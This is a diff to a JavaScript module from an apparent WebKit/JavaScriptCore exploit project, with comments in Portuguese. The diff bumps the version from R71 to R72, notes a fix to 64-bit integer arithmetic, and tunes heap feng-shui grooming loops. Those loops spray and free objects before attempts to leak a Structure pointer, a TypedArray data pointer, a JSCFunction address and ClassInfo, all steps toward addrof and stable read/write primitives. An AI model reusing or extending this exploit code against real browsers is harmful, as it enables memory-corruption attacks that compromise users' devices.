@@ -1,10 +1,8 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v108 - R71 - Fixes, Refined Grooming & New Leak Strategies)
+// js/script3/testArrayBufferVictimCrash.mjs (v108 - R72 - Fixes, Refined Grooming & New Leak Strategies)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// 1. CORREÇÃO DE ERRO: Substituição de `isZero()` e `NaN` comparações por `equals(AdvancedInt64.Zero)`
-//    e `equals(AdvancedInt64.NaNValue)` para garantir compatibilidade com AdvancedInt64.
-//    Remoção de 'span class="math-inline"' de strings de log no core_exploit.
-//    Correção de erro de sintaxe no config.mjs.
+// 1. CORREÇÃO DE ERRO: `RangeError` na `AdvancedInt64.add` corrigido em `utils.mjs`.
+//    Garantido que números simples passados para `add` são tratados como `AdvancedInt64(value, 0)`.
 // 2. Heap Grooming Refinado: Maior diversidade e volume de objetos no spray, com
 //    liberação controlada de "fillers" para otimizar o layout do heap.
 // 3. Novas Tentativas de Vazamento Aprimoradas:
@@ -26,7 +24,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R71_FixAndNewLeaks";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R72_FixAndNewLeaks";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -186,7 +184,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) {
             aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10));
             aggressive_feng_shui_objects.push({});
-            aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50)));
+            aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 100) + 10)));
             aggressive_feng_shui_objects.push(new Date());
             aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 100) + 5));
         }
@@ -224,7 +222,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // 2. TENTATIVA DE VAZAMENTO: ArrayBuffer - Vazamento de Structure* (grooming reforçado)
         logS3("  Executando Heap Grooming novamente antes de tentar ArrayBuffer...", "info");
         aggressive_feng_shui_objects = []; filler_objects = [];
-        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects.push({}); aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50))); aggressive_feng_shui_objects.push(new Date()); aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 100) + 5)); }
+        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects.push({}); aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 100) + 10))); aggressive_feng_shui_objects.push(new Date()); aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 100) + 5)); }
         for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { aggressive_feng_shui_objects[i] = null; }
         for (let i = 0; i < NUM_FILLER_OBJECTS; i++) { filler_objects.push({ filler_val: 0xCCCCCCCC, filler_id: i }); }
         aggressive_feng_shui_objects.length = 0; aggressive_feng_shui_objects = null;
@@ -247,7 +245,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // 3. TENTATIVA DE VAZAMENTO: TypedArray Data Pointer (ArrayBufferView `data` field)
         logS3("  Executando Heap Grooming novamente antes de tentar TypedArray Data Pointer...", "info");
         aggressive_feng_shui_objects = []; filler_objects = [];
-        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects.push({}); aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50))); aggressive_feng_shui_objects.push(new Date()); aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 100) + 5)); }
+        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects.push({}); aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 100) + 10))); aggressive_feng_shui_objects.push(new Date()); aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 100) + 5)); }
         for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { aggressive_feng_shui_objects[i] = null; }
         for (let i = 0; i < NUM_FILLER_OBJECTS; i++) { filler_objects.push({ filler_val: 0xCCCCCCCC, filler_id: i }); }
         aggressive_feng_shui_objects.length = 0; aggressive_feng_shui_objects = null;
@@ -307,7 +305,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // 4. TENTATIVA DE VAZAMENTO: Endereço de uma JSCFunction (Função JS Nativga)
         logS3("  Executando Heap Grooming novamente antes de tentar JSCFunction...", "info");
         aggressive_feng_shui_objects = []; filler_objects = [];
-        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects.push({}); aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50))); aggressive_feng_shui_objects.push(new Date()); aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 100) + 5)); }
+        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects.push({}); aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 100) + 10))); aggressive_feng_shui_objects.push(new Date()); aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 100) + 5)); }
         for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { aggressive_feng_shui_objects[i] = null; }
         for (let i = 0; i < NUM_FILLER_OBJECTS; i++) { filler_objects.push({ filler_val: 0xCCCCCCCC, filler_id: i }); }
         aggressive_feng_shui_objects.length = 0; aggressive_feng_shui_objects = null;
@@ -358,7 +356,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // 5. NOVA TENTATIVA DE VAZAMENTO: JSC::ClassInfo::m_cachedTypeInfo
         logS3("  Executando Heap Grooming novamente antes de tentar JSC::ClassInfo::m_cachedTypeInfo...", "info");
         aggressive_feng_shui_objects = []; filler_objects = [];
-        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects.push({}); aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50))); aggressive_feng_shui_objects.push(new Date()); aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 100) + 5)); }
+        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects.push({}); aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 100) + 10))); aggressive_feng_shui_objects.push(new Date()); aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 100) + 5)); }
         for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { aggressive_feng_shui_objects[i] = null; }
         for (let i = 0; i < NUM_FILLER_OBJECTS; i++) { filler_objects.push({ filler_val: 0xCCCCCCCC, filler_id: i }); }
         aggressive_feng_shui_objects.length = 0; aggressive_feng_shui_objects = null;
